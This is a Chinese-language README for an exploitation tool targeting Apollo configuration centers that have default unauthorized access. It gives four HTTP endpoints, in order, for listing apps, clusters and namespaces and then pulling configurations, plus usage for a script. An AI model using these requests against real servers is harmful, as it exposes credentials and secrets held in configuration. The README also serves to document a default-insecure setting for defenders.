# Apollo_unauth
Apollo 配置中心未授权获取配置漏洞利用

## 0x00：背景
Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。
项目地址: https://github.com/ctripcorp/apollo

## 0x01：默认不安全
从 issues-2099 可以看出，根本不需要通过要鉴权的 apollo-dashboard ，只要通过伪造成客户端，即可未授权获取相应的配置信息。

Apollo 官方的解决方案是：

1.6.0 版本开始增加访问密钥机制，只有经过身份验证的客户端才能访问敏感配置。如果应用开启了访问密钥，客户端需要配置密钥，否则无法获取配置。但是默认不会开启此项功能。

1.7.1 版本开始可以为 apollo-adminservice 开启访问控制，从而只有合法的 apollo-portal 才能访问对应接口，以增强安全性。类似于增加配置：

admin-service.access.control.enabled = true
admin-service.access.tokens=098f6bcd4621d373xade4e832627b4f6
有意思的是，默认 admin-service.access.control.enabled 值为 false，也就是默认不会开启此项功能。

## 0x03：漏洞利用
由于网上没有漏洞细节，所以我下载了 Apollo 源码，分析了下几个服务的相关代码，下面给出一种利用方法。

大致流程就是利用默认可未授权访问的 apollo-configservice 和 apollo-adminservice 服务，通过调用相关接口获取所有能够获取到的配置信息。

```
# 1. 获取所有的应用基本信息(包含 appId)
http://test.landgrey.me:8090/apps

# 2. 获取相关 appId 的所有 cluster
http://test.landgrey.me:8090/apps/<appId>/clusters

# 3. 获取相关 appId 的 namespaces
http://test.landgrey.me:8090/apps/<appId>/appnamespaces

# 4. 组合 appId cluster namespaceName 获取配置 configurations
http://test.landgrey.me:8080/configs/<appId>/<cluster>/<namespaceName>
```

脚本用法如下：

Usage: Apollo_unauth.py -t <apollo_adminservice_url> and -c <apollo_configservice_url>

参考文章：https://buaq.net/go-53399.html
